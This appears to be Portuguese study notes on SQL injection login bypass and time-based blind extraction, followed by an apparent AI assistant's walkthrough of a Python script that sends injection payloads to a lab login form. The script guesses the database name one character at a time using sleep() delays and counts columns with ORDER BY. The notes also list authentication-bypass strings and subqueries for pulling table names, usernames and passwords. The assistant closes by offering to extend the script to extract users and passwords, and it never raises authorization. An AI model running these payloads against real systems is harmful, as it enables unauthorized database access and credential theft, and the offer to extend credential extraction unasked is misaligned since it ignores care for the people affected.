https://owasp.org/www-community/attacks/Blind_SQL_Injection

SQL Injection Time Based Blind

site tem um login e senha

digitando login e senha, ele diz que o username or password está invalido

como fazer bypass de uma autenticação?
	 como podemos conseguir usar o SQL injection para conseguir burlar a validação 
	 ex: CASO 1
	 
	 SELECET * from users
	 where usernam='admin'
	 and
	 password='admin'

´podemos tentar  CASO 2 ex:

	 SELECET * from users
	 where usernam='' 1 or 1 '-''
	 and
	 password='admin'

O CASO 2 nos temos um problema pq depois do campo de nome nos temos toda uma query e essa e precisamos que ele ignore  o resto dessa query e como faço isso?

eu comento a query
 podendo usar

'or 1=1# '
 ' or 1=1 -- - ''


no caso nos nao temos login e senha e nos queremos descobrir login e senha do usuario
porem nos nao temos output de erro e nao tenho como fazer UNION SELECT pq ele nao aparece pra gente na tela.

tecnica de timbased
podemos fazer ele esperar um tempo pra responder se a resposta for verdadeira e como nós podemos fazer iso para extrair dados do banco de dados?

SUBSTRING 
	Pega parte de um resultado de um comando
SUBSTRING(comando,inicio,fim)
if(comprador logico, 'se verdade','se for also

)

















Esse script que você enviou é um **ferramenta automatizada de SQL Injection do tipo Time-Based Blind**, feita em Python com a biblioteca `requests`.  
Vamos quebrar e explicar **parte por parte** o que ele faz:

---

## 🧠 Objetivo Geral:

Explorar uma aplicação web vulnerável a **SQL Injection** (no campo `username`) para **extrair informações do banco de dados** lentamente, com base no tempo de resposta (time-based).

---

## 📌 1. Função `req(query)`

```python
def req(query):
    url = "http://10.10.0.27"  # Alvo da requisição (mude para o IP correto)
    data = {"username": query, "password": "aaas"}  # Envia a SQLi no username
    r = requests.post(url, data=data)
    return r.text
```

Essa função envia uma **requisição POST** para a URL vulnerável, simulando um login, com a SQL injection embutida no campo `username`.

---

## 📌 2. Função `fuzz()` — **Time-Based para descobrir o nome do banco de dados**

```python
def fuzz():
    printables = string.printable
    nome_db = ""
    while True:
        for char in printables:
            guess_db = nome_db + char
            query = "' union select 1,2,if(substring((select database()),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -" 
```

### O que faz:

- Usa um brute-force letra por letra para descobrir o nome do banco de dados.
    
- Para cada caractere `c`, ele testa se o nome do banco começa com `nome_db + c`.
    
- Se a condição for **verdadeira**, o servidor **dorme 3 segundos (`sleep(3)`)**, indicando que acertamos o caractere.
    

```python
antes = time.time()
req(query)
depois = time.time()
total = depois - antes
if int(total) >= 3:
    nome_db = guess_db
    break
```

### Como interpreta o tempo:

- Se a resposta demorar ≥ 3 segundos, ele entende que o caractere está correto e adiciona ao nome do banco.
    
- Continua até completar todo o nome.
    

---

## 📌 3. Função `orderby()` — Descobrir quantas colunas existem

```python
def orderby(): 
    numeros = [1,2,3,4,5,6,7,8,9]
    for num in numeros:
        query = "' or 1=1 order by "+ str(num) + ' -- -'
        print(num)
        if not "Username or password is invalid!" in req(query):
            print(f'Union correct: {num}')
```

Essa função testa diferentes valores no `ORDER BY` para descobrir quantas colunas existem na consulta original do backend:

- Se você colocar um número maior que o número real de colunas, a query falha.
    
- O primeiro número que **não gera erro** é o número de colunas corretas.
    

---

## 📌 Comentários úteis no início do código:

Eles mostram como modificar a função `fuzz()` para extrair **tabelas**, **colunas**, **usuários** e **senhas** do banco, mudando apenas a subquery. Exemplo:

```sql
(select table_name from information_schema.tables where table_schema = 'cc' limit 0,1)
```

Essas instruções podem ser usadas trocando a subquery dentro da `substring()` para extrair qualquer dado do banco.

---

## ✅ Resumo

|Parte|O que faz|
|---|---|
|`req()`|Envia uma requisição com SQLi|
|`fuzz()`|Faz brute-force para descobrir o nome do banco com time-based SQLi|
|`orderby()`|Descobre quantas colunas tem a consulta do backend|
|Comentários|Guiam para descobrir tabelas, colunas, usuários e senhas|

---

Se quiser, posso te ajudar a adaptar esse script para descobrir tabelas, colunas, ou extrair usuários/senhas. É só me falar qual parte você está explorando agora. 👨‍💻🕵️‍♂️